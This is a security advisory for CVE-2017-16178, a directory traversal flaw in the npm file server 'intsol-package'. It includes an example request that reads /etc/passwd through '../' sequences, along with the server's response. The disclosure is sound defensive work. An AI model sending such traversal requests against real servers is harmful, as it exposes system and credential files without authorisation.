# [H] Directory Traversal in intsol-package

## Summary
Severity: High
Advisory: GHSA-23wc-v4mf-x7v4
CVE: CVE-2017-16178
CWE: CWE-22
Ecosystem: npm
CVSS: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2018-07-23
Source: https://github.com/advisories/GHSA-23wc-v4mf-x7v4
Type: github-advisory

## Affected
- npm: `intsol-package` — affected >=0

## Details
`intsol-package` is a file server.

`intsol-package` is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing "../" in the url.

**Example Request:**
```http
GET /../../../../../../../../../../etc/passwd HTTP/1.1
host:localhost
```
and the server's Response

```http
HTTP/1.1 200 OK
Date: Thu, 04 May 2017 23:59:18 GMT
Connection: keep-alive
Transfer-Encoding: chunked

{contents of /etc/passwd}
```


## Recommendation

No patch is available for this vulnerability.

It is recommended that the package is only used for local development, and if the functionality is needed for production, a different package is used instead.

## References
- https://nvd.nist.gov/vuln/detail/CVE-2017-16178
- https://github.com/JacksonGL/NPM-Vuln-PoC/blob/master/directory-traversal/intsol-package
- https://github.com/advisories/GHSA-23wc-v4mf-x7v4
- https://www.npmjs.com/advisories/461
